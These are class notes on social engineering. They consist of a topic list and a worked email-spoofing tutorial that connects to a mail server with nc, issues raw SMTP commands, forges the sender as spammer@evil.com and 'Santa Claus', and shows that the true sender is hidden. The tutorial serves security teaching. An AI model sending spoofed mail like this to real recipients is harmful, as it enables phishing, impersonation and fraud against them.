---
title: Social Engineering Class
---

Topics covered:

* What phishing attacks are
* Why servers shouldn't trust clients
* How to use poorly-placed trust to hack web sites
* SQL injection
* How to spoof email

Spoofing Email
--------------

Email servers run on port 25.  To figure out what machine handles email
for a domain, you can use the `dig` program to ask for the `mx` (mail
exchanger) record:

    $ dig -t mx yopmail.com

This will print out a lot of junk, you only care about the line with
"MX" in it:

    yopmail.com.            86400   IN      MX      1 smtp.yopmail.com.


This tells us that the machine `smtp.yopmail.com` handles mail for the
`yopmail.com` domain.

Now, let's spoof some email!  We use "telnet" to connect to port 25 of
yopmail.com.  If you're running Windows, you need to install a telnet
client.  [PuTTY](http://www.chiark.greenend.org.uk/~sgtatham/putty/) is
a good choice.

The parts you type are <b>in boldface</b>; the first line is just the
Unix command to open a connection to port 25.  If you're using PuTTY,
you'll do this through a dialog box.

<pre>
$ <b>nc smtp.yopmail.com 25</b>
Trying 87.98.164.155...
Connected to smtp.yopmail.com.
Escape character is '^]'.
220 mx.yopmail.com ESMTP *** 
<b>EHLO bub</b>
250 SIZE 150000
<b>MAIL FROM: &lt;spammer@evil.com&gt;</b>
250 OK
<b>RCPT TO: &lt;sittingduck@yopmail.com&gt;</b>
250 OK
<b>DATA</b>
354 Start mail input; end with <CRLF>.<CRLF>
<b>From: Santa Claus &lt;santa@north.pole&gt;</b>
<b>To: Sitting Duck &lt;sittingduck@yopmail.com&gt;</b>
<b>Subject: naughty</b>

<b>You have been very naughty this year!</b>
<b>.</b>
250 mail saved
</pre>

Now you can open up <http://yopmail.com/>, check the `sittingduck`
account, and see the email.  Notice how there doesn't seem to be any way
to look up who actually sent it (spammer@evil.com); all you get is that
it came from Santa Claus.
